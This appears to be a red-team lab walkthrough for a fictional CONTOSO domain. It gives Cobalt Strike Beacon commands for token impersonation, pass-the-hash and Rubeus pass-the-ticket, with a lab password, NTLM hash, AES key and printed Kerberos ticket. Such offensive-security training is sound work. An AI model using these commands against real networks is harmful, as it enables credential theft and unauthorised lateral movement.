### Token Impersonation

## Make Token

1.  From the medium-integrity Beacon, create and impersonate an access token for rsteel.
    
    1. make_token CONTOSO\rsteel Passw0rd!
2.  Drop the impersonation.
    
    1. rev2self

## Steal Token

1.  From the high-integrity Beacon, open the Process Browser.
    
    1. process_browser
2.  Select a process owned by rsteel.
    
3.  Steal the primary access token of that process and add it to the token store.
    
    1. Click **Steal Token**.
    2. Mask Type: TOKEN_ALL_ACCESS
    3. Store: true
4.  Impersonate that token.
    
    1. Run token-store use 0 from the Beacon console.
5.  Drop the impersonation.
    
    1. rev2self
6.  Remove the token from the store.
    
    1. token-store remove 0

# Pass the Hash

1.  From the high-integrity Beacon, perform a PtH attack for Robert Steel.
    
    1. pth CONTOSO\rsteel fc525c9683e8fe067095ba2ddc971889
2.  Drop the impersonation.
    
    1. rev2self

# Pass the Ticket

1.  Using their AES256 key, request a TGT for rsteel from the medium-integrity Beacon.
    
    BeaconTypeCopy
    
    `execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:rsteel /domain:CONTOSO.COM /aes256:05579261e29fb01f23b007a89596353e605ae307afcd1ad3234fa12f94ea6960 /nowrap`
    
```
doIFqDCCBaSgAwIBBaEDAgEWooIEsjCCBK5hggSqMIIEpqADAgEFoQ0bC0NPTlRPU08uQ09NoiAwHqADAgECoRcwFRsGa3JidGd0GwtDT05UT1NPLkNPTaOCBGwwggRooAMCARKhAwIBAqKCBFoEggRWWBH7+tEZk6OBVdmIKPDRkHPxT+FmKsPS43NR4BiPqjtdIM4Cn05SekadqgH43GVyW4zcQkGvj79SMK2Z1OF86eYdY+pH28gqfa2unO8hnL9vVX8odKnQYSiJI+v1NA6s8ztO1ldmN0RCw21rfV0tZT29sY/TYV1pDuywhGOxCPvfWRHQdVCAoB1jl2Wwv2o9MA2Gc5MAjC6xk5sPuc72HiLICGc6e9c/cIHjGtdbjOPKcJtLgdjqFs6tLoRHSWxJ1rigb1KDqbkMV3UQhRDUjx8VLiHP4w9yBhXjMkjTaJHdZc6n0UHV7x7cZyRenJpbrVsdqfCRp4dkMmIOwdzEcrAu0NgQojcguvpuhGAy0358O9EN2OXjNdMHip2BwJvqZOgEoTYV24swqUGKgD0LymD1VTYf2Y+Tcrf5ljXik9rTzX5pSKBiHJ8D4mpGxtdA3IVrL+m8M8nzW94KFXJqU6SkV38hOmcW2nWe5u18ugBzB16O7jJb7AqEOCDai2jsQ12eABK3G9NgtexQoL95aEY2Yg22TNKZJrpuJajXENODFd+CvJ52sySxhcSjVKZ1rKs2xIF0YlF37+g2tx7jzWcISNNcQKzvnmF5pKwlkoGEPhknqXcGPFY936xM+uQoCZeTj5AweXZb4UTX2M7Ouw/ic0DWrpgb2TIBPifE+SRuuF5b16FkWV2K5QMuVA1Vr+QgtkToZoT16Dp1a+ln8kDpMYnBysCXfvBw3/o618Sctlj8AT+wCRw+tYiCFJFAciTTGu85dxY08PD3ep5fQVTtofN5Xo7AmcnYaOm/C9bVe6BWXJKBbnJuwxeeP5k+RqUe4Q53g+gzEvhri3+gc1VSsXzQv5gVmffadpItn3K5xr20Joj23pCpgdF0ycUpbr2Bh1z6Bs38wIp9K5uteQJa491hrdsXPOZ76IkMB9gXf8FrTuf+CjFPluYu5uRgJQiiqwyP7drYuQFpHVjHHLDQdyNo5nGpz7rmqAF0+6u5xiLrp7FgFw2DbHzRqB6oaP49IP9X9fUdp5Fe08QcmFLTt6Tp3zclUIjl/KI1aDFv3/0GmKezGxrrWNptI2Zx0d8m93PfcDqNEmXhGbXgHq5XxElszxGO9PsJaleVjXlROzKX3gHMtlG5hof5tu4W9P0Cbm6FS/orMfVEvl8NOgKlKxL+s9Uy9X4B0I30e/R4jl96oXe7GTmj0qq3e9E/hUbuW3Hx311T//NE6oW+4scge9BKobn5sI7zHjt0+sS0HUENW06Z9JWcPTWMgILAmLS3lbIh3wP4Tn8O0BAcbvrhlyiZV/hmuEag0QzT+xGCseIj6GFoN0LTSwUJ7UZsGLlHVKsAvWRhbFTFxflJz5g92ePZVyTP3DT8LWliaAPyghulOABPU+hVFEFtViLdKdvi66IHKMRPqc+jG/k2GBVAzf1TRly9KGEnMC2lXNoew8fUtJgVu9oK3K1i6/BSa4SHabOpo4HhMIHeoAMCAQCigdYEgdN9gdAwgc2ggcowgccwgcSgKzApoAMCARKhIgQgVvsNsAzqpkCEd8hwXpsyLB0p79FtLB6Zd7N/f/I4TeChDRsLQ09OVE9TTy5DT02iEzARoAMCAQGhCjAIGwZyc3RlZWyjBwMFAEDhAAClERgPMjAyNTA3MTEwNDE0NDNaphEYDzIwMjUwNzExMTQxNDQzWqcRGA8yMDI1MDcxODA0MTQ0M1qoDRsLQ09OVE9TTy5DT02pIDAeoAMCAQKhFzAVGwZrcmJ0Z3QbC0NPTlRPU08uQ09N

```

2.  From the high-integrity Beacon, inject and impersonate the ticket.
    
    BeaconTypeCopy
    
    `execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\notepad.exe /username:rsteel /domain:CONTOSO.COM /password:FakePass /ticket:[TGT]`
    
    1. steal_token [PID]
3.  Drop the impersonation.
    
    1. rev2self
    2. kill [PID]